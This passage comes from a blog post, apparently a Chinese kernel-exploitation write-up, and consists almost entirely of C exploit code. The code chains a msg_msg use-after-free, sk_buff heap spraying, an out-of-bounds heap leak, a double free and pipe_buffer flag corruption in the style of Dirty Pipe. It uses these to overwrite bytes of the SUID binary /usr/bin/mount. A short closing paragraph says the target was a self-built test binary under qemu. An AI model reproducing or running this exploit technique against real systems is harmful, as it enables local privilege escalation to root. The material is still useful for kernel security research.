+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// create a UAF, start sk_buff spray
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>msgrcv</span>(msgids[second_id], <span style=color:#666>&amp;</span>buf, SECOND_MSG_SIZE, <span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>) <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;[-] msgrcv&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> fake_msg_buf[<span style=color:#40a070>0x400</span> <span style=color:#666>-</span> <span style=color:#40a070>320</span>];
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> msg_msg <span style=color:#666>*</span>fake_msg <span style=color:#666>=</span> (<span style=color:#007020;font-weight:700>struct</span> msg_msg <span style=color:#666>*</span>)fake_msg_buf;
+</span></span><span style=display:flex><span>  fake_msg<span style=color:#666>-&gt;</span>m_list.next <span style=color:#666>=</span> <span style=color:#40a070>0xAAAAAAAAAAAAAAAA</span>;
+</span></span><span style=display:flex><span>  fake_msg<span style=color:#666>-&gt;</span>m_list.prev <span style=color:#666>=</span> <span style=color:#40a070>0xBBBBBBBBBBBBBBBB</span>;
+</span></span><span style=display:flex><span>  fake_msg<span style=color:#666>-&gt;</span>next <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>  fake_msg<span style=color:#666>-&gt;</span>m_ts <span style=color:#666>=</span> FIRST_MSG_SIZE;
+</span></span><span style=display:flex><span>  fake_msg<span style=color:#666>-&gt;</span>m_type <span style=color:#666>=</span> <span style=color:#40a070>2</span>;
+</span></span><span style=display:flex><span>  fake_msg<span style=color:#666>-&gt;</span>security <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>sk_buff_spray</span>(sk_sockets, fake_msg_buf, <span style=color:#007020;font-weight:700>sizeof</span>(fake_msg_buf)) <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;[-] failed to spray sk_buff&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[+] spray sk_buff done!</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// oob read second msg
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>msgrcv</span>(msgids[first_id], <span style=color:#666>&amp;</span>buf, FIRST_MSG_SIZE, <span style=color:#40a070>1</span>, MSG_COPY <span style=color:#666>|</span> IPC_NOWAIT) <span style=color:#666>&lt;</span>
+</span></span><span style=display:flex><span>      <span style=color:#40a070>0</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;[-] msgrcv&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[+] successfully oob read</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> msg_msg <span style=color:#666>*</span>next_msg_ptr <span style=color:#666>=</span> (<span style=color:#007020;font-weight:700>struct</span> msg_msg <span style=color:#666>*</span>)<span style=color:#666>&amp;</span>buf[SECOND_MSG_SIZE <span style=color:#666>+</span> <span style=color:#40a070>4</span>];
+</span></span><span style=display:flex><span>  <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[+] heap leaked prev_ptr 0x%llx next_ptr 0x%llx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,
+</span></span><span style=display:flex><span>         next_msg_ptr<span style=color:#666>-&gt;</span>m_list.prev, next_msg_ptr<span style=color:#666>-&gt;</span>m_list.next);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// start leaking UAFed object address
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#06287e>assert</span>(<span style=color:#007020;font-weight:700>sizeof</span>(buf) <span style=color:#666>&gt;</span> <span style=color:#007020;font-weight:700>sizeof</span>(fake_msg_buf));
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>sk_buff_free</span>(sk_sockets, buf, <span style=color:#007020;font-weight:700>sizeof</span>(fake_msg_buf)) <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;[-] freeing sk_buff&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#902000>u_int64_t</span> some_heap_address <span style=color:#666>=</span> next_msg_ptr<span style=color:#666>-&gt;</span>m_list.prev;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// !!! you don&#39;t need to leak the UAFed object&#39;s address at all!
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#60a0b0;font-style:italic>//  fake_msg-&gt;next = next_msg_ptr-&gt;m_list.prev - 8;
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#60a0b0;font-style:italic>//  fake_msg-&gt;m_ts = FIRST_MSG_SIZE + 0x1000 - sizeof(struct msg_msgseg);
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#60a0b0;font-style:italic>//  // spray again..
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#60a0b0;font-style:italic>//  if (sk_buff_spray(sk_sockets, fake_msg_buf, sizeof(fake_msg_buf)) &lt; 0) {
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#60a0b0;font-style:italic>//    err_exit(&#34;[-] failed to spray sk_buff&#34;);
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#60a0b0;font-style:italic>//  }
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#60a0b0;font-style:italic>//
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#60a0b0;font-style:italic>//  if (msgrcv(msgids[first_id], &amp;buf, fake_msg-&gt;m_ts, 1, MSG_COPY |
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#60a0b0;font-style:italic>//  IPC_NOWAIT) &lt;
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#60a0b0;font-style:italic>//      0) {
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#60a0b0;font-style:italic>//    err_exit(&#34;[-] msgrcv&#34;);
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#60a0b0;font-style:italic>//  }
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#60a0b0;font-style:italic>//  u_int64_t uaf_object_addr =
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#60a0b0;font-style:italic>//      ((u_int64_t *)((char *)buf + FIRST_MSG_SIZE + 4))[0] - 0x400;
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#60a0b0;font-style:italic>//  printf(&#34;[+] UAF object address: 0x%llx\n&#34;, uaf_object_addr);
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// fix UAFed object to double free it
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  fake_msg<span style=color:#666>-&gt;</span>m_list.next <span style=color:#666>=</span> some_heap_address <span style=color:#666>+</span> <span style=color:#40a070>0x800</span>;
+</span></span><span style=display:flex><span>  fake_msg<span style=color:#666>-&gt;</span>m_list.prev <span style=color:#666>=</span> some_heap_address <span style=color:#666>+</span> <span style=color:#40a070>0x800</span>;
+</span></span><span style=display:flex><span>  fake_msg<span style=color:#666>-&gt;</span>next <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>  fake_msg<span style=color:#666>-&gt;</span>m_ts <span style=color:#666>=</span> SECOND_MSG_SIZE;
+</span></span><span style=display:flex><span>  fake_msg<span style=color:#666>-&gt;</span>security <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>  fake_msg<span style=color:#666>-&gt;</span>m_type <span style=color:#666>=</span> <span style=color:#40a070>1</span>;
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// if (sk_buff_free(sk_sockets, buf, sizeof(fake_msg_buf)) &lt; 0) {
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#60a0b0;font-style:italic>//    err_exit(&#34;[-] freeing sk_buff&#34;);
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#60a0b0;font-style:italic>// }
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>sk_buff_spray</span>(sk_sockets, fake_msg_buf, <span style=color:#007020;font-weight:700>sizeof</span>(fake_msg_buf)) <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;[-] failed to spray sk_buff&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>msgrcv</span>(msgids[first_id], <span style=color:#666>&amp;</span>buf, SECOND_MSG_SIZE, <span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>) <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;[-] msgrcv&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[+] double free done!</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// spray pipe_buffer
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> PIPE_SUM; i<span style=color:#666>++</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>pipe</span>(pipe_fds[i]) <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;[-] pipe&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>write</span>(pipe_fds[i][<span style=color:#40a070>1</span>], <span style=color:#4070a0>&#34;AAAAAAAA&#34;</span>, <span style=color:#40a070>8</span>) <span style=color:#666>!=</span> <span style=color:#40a070>8</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;[-] write pipe&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>// pipe primitve
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    <span style=color:#902000>int</span> suid_fd <span style=color:#666>=</span> <span style=color:#06287e>open</span>(<span style=color:#4070a0>&#34;/usr/bin/mount&#34;</span>, O_RDONLY);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (suid_fd <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;[-] open suid&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>// mount.main@0x1775
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    <span style=color:#902000>off64_t</span> offset <span style=color:#666>=</span> <span style=color:#40a070>0x1775</span> <span style=color:#666>-</span> <span style=color:#40a070>1</span>;  <span style=color:#60a0b0;font-style:italic>// we will read one byte
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>splice</span>(suid_fd, <span style=color:#666>&amp;</span>offset, pipe_fds[i][<span style=color:#40a070>1</span>], <span style=color:#007020>NULL</span>, <span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>) <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;[-] splice&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[+] pipe spray done!</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> found <span style=color:#666>=</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>;
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> pipe_buf[<span style=color:#40a070>0x400</span> <span style=color:#666>-</span> <span style=color:#40a070>320</span>];
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> SOCKET_SUM; i<span style=color:#666>++</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> j <span style=color:#666>=</span> <span style=color:#40a070>0</span>; j <span style=color:#666>&lt;</span> SK_BUFF_IN_ONE_SOCKET; j<span style=color:#666>++</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>read</span>(sk_sockets[i][<span style=color:#40a070>1</span>], fake_msg_buf, <span style=color:#007020;font-weight:700>sizeof</span>(fake_msg_buf)) <span style=color:#666>!=</span>
+</span></span><span style=display:flex><span>          <span style=color:#007020;font-weight:700>sizeof</span>(fake_msg_buf)) {
+</span></span><span style=display:flex><span>        <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;[-] write sk_buff&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>;
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>struct</span> pipe_buffer <span style=color:#666>*</span>pipe_buffer_ptr <span style=color:#666>=</span> (<span style=color:#902000>void</span> <span style=color:#666>*</span>)fake_msg_buf;
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> (pipe_buffer_ptr<span style=color:#666>-&gt;</span>ops <span style=color:#666>&gt;</span> <span style=color:#40a070>0xffffffff81000000</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#06287e>memcpy</span>(pipe_buf, fake_msg_buf, <span style=color:#007020;font-weight:700>sizeof</span>(pipe_buf));
+</span></span><span style=display:flex><span>        <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[+] found pipe_buffer, ops: 0x%llx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, pipe_buffer_ptr<span style=color:#666>-&gt;</span>ops);
+</span></span><span style=display:flex><span>        found <span style=color:#666>=</span> <span style=color:#40a070>1</span>;
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (found <span style=color:#666>!=</span> <span style=color:#40a070>1</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;[-] failed to find pipe_buffer&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> pipe_buffer <span style=color:#666>*</span>pipe_buf_ptr <span style=color:#666>=</span> (<span style=color:#902000>void</span> <span style=color:#666>*</span>)pipe_buf;
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> <span style=color:#40a070>16</span>; i<span style=color:#666>++</span>) {
+</span></span><span style=display:flex><span><span style=color:#007020>#define PIPE_BUF_FLAG_CAN_MERGE 0x10 </span><span style=color:#60a0b0;font-style:italic>/* can merge buffers */</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>    pipe_buf_ptr[i].flags <span style=color:#666>|=</span> PIPE_BUF_FLAG_CAN_MERGE;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>sk_buff_spray</span>(sk_sockets, pipe_buf_ptr, <span style=color:#007020;font-weight:700>sizeof</span>(fake_msg_buf)) <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;[+] sk_buff_spray&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[!] changed pipe_buffer flag</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[!] writing to pipe</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> PIPE_SUM; i<span style=color:#666>++</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>write</span>(pipe_fds[i][<span style=color:#40a070>1</span>], <span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\xCC\xCC\xCC</span><span style=color:#4070a0>&#34;</span>, <span style=color:#40a070>3</span>) <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;write pipe&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>这个 exp 可以修改 /usr/bin/mount 的 0x1775 开始的 3 个字节为 0xCC（写这个地址是因为我在 qemu 中自己编译了一个 fake root owned suid mount ，这个程序的 main 函数在 0x1775 处）。</p></section><div class=post-tags></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
